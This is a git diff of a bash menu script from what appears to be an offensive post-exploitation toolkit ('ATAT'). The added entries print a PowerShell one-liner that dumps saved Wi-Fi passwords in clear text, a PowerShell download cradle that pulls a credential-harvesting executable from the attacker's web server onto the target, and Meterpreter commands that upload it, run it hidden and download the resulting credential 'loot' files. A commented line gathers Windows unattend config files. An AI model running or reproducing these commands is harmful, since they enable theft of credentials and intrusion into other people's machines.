-		#echo -e "\E[1;34m::::: \e[97mWindows Terminal Command\E[1;34m:::::" 
-		#echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/$webuserfile\',\'$pshuserpath\'\)
-		
-        echo -e "\E[1;34m::::: \e[97mMeterpreter Command\E[1;34m:::::" 
+		echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
         echo download \"$remoteuserfile\" \"$msflocaluserpath\"
 		    ;;
 		"Push File To Target with PSH / Meterpreter")
@@ -1454,12 +1500,95 @@ do
 		service apache2 start
 	fi 
 	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter Local File Including Full Path (/var/www/html/filename.ext): ' localuserfile; read -p 'Enter Local File Webserver Path (filename.ext): ' webuserfile; read -p 'Enter File Destination Full Path on Target Machine for MSF (%WINDIR%\\\\\System32\\\\\file.ext): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (%WINDIR%\\System32\\file.ext): ' pshuserpath;
-		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command\E[1;34m:::::" 
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command \E[1;34m:::::" 
 		echo powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/$webuserfile\',\'$pshuserpath\'\)
 			
-        echo -e "\E[1;34m::::: \e[97mMeterpreter Command\E[1;34m:::::" 
+        echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
         echo upload $localuserfile $msfuserpath
             ;;
+        "Wireless Password Stealer")
+    echo -e "\E[1;34m::::: \e[97mA Powershell Terminal With Admin Rights Is Necessary \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mPowershell Command To Get Wireless Passwords \E[1;34m:::::" 
+    echo ""
+    echo \(netsh wlan show profiles\) \| Select-String \"\\:\(.+\)\$\" \| \%\{\$name\=\$_.Matches \| \% \{\$_.Groups\[1\].Value.Trim\(\)\}\; \$_\} \| \%\{\(netsh wlan show profile name\=\""\$name\"" key\=clear\)\}  \| Select-String \""Key Content\\W+\\:(.+)\$\"" \| \%\{\$pass\=\$_.Matches \| \% \{\$_.Groups\[1\].Value.Trim\(\)\}\; \$_\} \| \%\{\[PSCustomObject\]@\{ "PROFILE_NAME"\=\$name\;PASSWORD\=\$pass \}\} \| Format-Table -AutoSize \| Out-File WiFi.txt
+    echo ""
+    echo -e "\E[1;34m::::: \e[97mA WiFi.txt File Will Be Created In The Directory From Which This Command Is Run \E[1;34m:::::" 
+    echo -e "\E[1;34m::::: \e[97mIMPORTANT! \E[1;34m:::::"
+    echo -e "\E[1;34m::::: \e[97mChange Directories Into One That Can Be Written To Without The Need For A UAC Prompt Before You Run This Command! \E[1;34m:::::" 
+    #echo ""
+	#echo -e "\E[1;34m::::: \e[97mPowershell Command To Get Install Configs\E[1;34m:::::" 
+	#echo \$F \= @\(\)\;\$F \+\= \"C:\\sysprep.inf\"\;\$F \+\= \"C:\\sysprep\\sysprep.xml\"\;\$F \+\= \"C:\\WINDOWS\\panther\\Unattend\\Unattended.xml\"\;\$F \+\= \"C:\\WINDOWS\\panther\\Unattended.xml\"\; \$i \= 0\; foreach\(\$file in \$F\) \{if \(Test-Path \$file\)\{cp \$file \c:\;\$i\+\+\}\}
+			;;
+		"Windows 64 bit Credenital & Loot Harvester")
+    SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
+		service apache2 start
+	fi 
+	cp ~/ATAT/word_x64.txt /var/www/html/word_x64.txt
+	chown www-data:www-data /var/www/html/word_x64.txt
+	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter File Destination Full Path on Target Machine for MSF (Recommended: %USERPROFILE%\\\\\\word_x64.exe): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (Recommended: %USERPROFILE%\\word_x64.exe): ' pshuserpath;
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command \E[1;34m:::::" 
+		echo -e "\E[1;34m\e[97m \e[31m powershell \(new-object System.Net.WebClient\).DownloadFile\(\'http://$userhost/word_x64.txt\',\'$pshuserpath\'\)\e[97m\E[1;34m"
+			
+        echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
+        echo -e "\E[1;34m\e[97m \e[31m upload /root/ATAT/word_x64.txt $msfuserpath \e[97m\E[1;34m"
+        echo ""
+		echo -e "\E[1;34m::::: \e[97mRun These Commands Once The File Is On The Target \E[1;34m:::::" 
+		echo ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Commands (Change Your Chosen File Path As Appropriate \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m word_x64.exe all -vv -oA \e[97m\E[1;34m"
+		echo ""
+		echo -e "\E[1;34m::::: \e[97mMeterpreter Command (Change Your Chosen File Path As Appropriate) \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m execute -H -c -i -f word_x86.exe -a 'all -vv -oA' \e[97m\E[1;34m"
+		echo ""
+		echo -e "\E[1;34m::::: \e[97mJSON & TXT \"credentials_xxxxxxxx_xxxxxx\" Output Files Are In The Directory You Ran This EXE From \E[1;34m:::::"
+		echo ""	
+		echo -e "\E[1;34m::::: \e[97m*EXAMPLE* Meterpreter Command To Download Your Loot \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.txt' /root/ATAT/ \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.json' /root/ATAT/ \e[97m\E[1;34m"
+			;;
+		"Windows 32 bit Credenital & Loot Harvester")
+    SERVICE=Apache;
+	secs=$(date '+%S');
+	if service apache2 status | grep -v grep | grep running > /dev/null
+	then
+		echo "$SERVICE service running"
+	else
+		echo "$SERVICE is not running, Starting service." 
+		service apache2 start
+	fi 
+	cp ~/ATAT/word_x86.txt /var/www/html/word_x86.txt
+	chown www-data:www-data /var/www/html/word_x86.txt
+	read -p 'Set LHOST IP or Domain Name & Port (if necessary i.e., 1.1.1.1 OR 1.1.1.1:8080): ' userhost; read -p 'Enter File Destination Full Path on Target Machine for MSF (Recommended: %USERPROFILE%\\\\\\word_x86.exe): ' msfuserpath; read -p 'Enter File Destination Full Path on Target Machine for PSH (Recommended: %USERPROFILE%\\word_x86.exe): ' pshuserpath;
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Command \E[1;34m:::::" 
+		echo -e "\E[1;34m\e[97m \e[31m powershell (new-object System.Net.WebClient).DownloadFile('http://$userhost/word_x86.txt','$pshuserpath')\e[97m\E[1;34m"
+			
+        echo -e "\E[1;34m::::: \e[97mMeterpreter Command \E[1;34m:::::" 
+        echo -e "\E[1;34m\e[97m \e[31m upload /root/ATAT/word_x86.txt $msfuserpath \e[97m\E[1;34m"
+        echo ""
+		echo -e "\E[1;34m::::: \e[97mRun These Commands Once The File Is On The Target \E[1;34m:::::" 
+		echo ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
+		echo -e "\E[1;34m::::: \e[97mWindows Terminal Commands (Change Your Chosen File Path As Appropriate \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m word_x86.exe all -vv -oA \e[97m\E[1;34m"
+		echo ""
+		echo -e "\E[1;34m::::: \e[97mMeterpreter Command (Change Your Chosen File Path As Appropriate) \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m cd %USERPROFILE% \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m execute -H -c -i -f word_x86.exe -a 'all -vv -oA' \e[97m\E[1;34m"
+		echo ""
+		echo -e "\E[1;34m::::: \e[97mJSON & TXT \"credentials_xxxxxxxx_xxxxxx\" Output Files Are In The Directory You Ran This EXE From \E[1;34m:::::"
+		echo ""
+		echo -e "\E[1;34m::::: \e[97m*EXAMPLE* Meterpreter Command To Download Your Loot \E[1;34m:::::"
+		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.txt' /root/ATAT/ \e[97m\E[1;34m"
+		echo -e "\E[1;34m\e[97m \e[31m download '%USERPROFILE%\\\\\\\credentials_23082018_182736.json' /root/ATAT/ \e[97m\E[1;34m"
+			;;
         "Main Menu")
             ~/ATAT/ATAT.sh
             ;;
@@ -1474,8 +1603,8 @@ done
 
 "00" | "00" ) 
   echo -e "\E[1;34m::::: \e[97mReset & Recharge \E[1;34m:::::"
-  echo -e "\E[1;34m::::: \e[97mRemoving All Results From Prior Campaigns...\E[1;34m:::::"
-  echo -e "\E[1;34m::::: \e[97mThis Does NOT remove Any Password Cracking/Captured Hash Output\E[1;34m:::::"
+  echo -e "\E[1;34m::::: \e[97mRemoving All Results From Prior Campaigns... \E[1;34m:::::"
+  echo -e "\E[1;34m::::: \e[97mThis Does NOT remove Any Password Cracking/Captured Hash Output \E[1;34m:::::"
 	sleep 15
   rm ~/ATAT/SNMP_logs.txt
   rm ~/ATAT/LBD_Results.txt
